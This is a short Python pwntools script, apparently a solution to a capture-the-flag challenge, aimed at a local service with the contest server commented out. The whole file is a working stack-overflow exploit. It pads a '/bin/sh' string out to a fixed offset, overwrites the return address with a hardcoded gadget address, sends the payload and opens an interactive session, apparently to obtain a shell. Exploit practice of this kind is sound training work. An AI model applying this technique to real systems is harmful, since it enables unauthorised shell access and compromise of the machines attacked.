from pwn import *

#r = remote("ctf.adl.csie.ncu.edu.tw", 11007)
r = remote("127.0.0.1", 8888)
context.arch = "amd64"

raw_input('data')

payload = "/bin/sh\x00" + "a" * ( 0x128 - 8)
payload += p64(0x4000ed) + "a" * ( 322 - 0x128 - 8 - 1)

r.sendline(payload)

r.interactive()

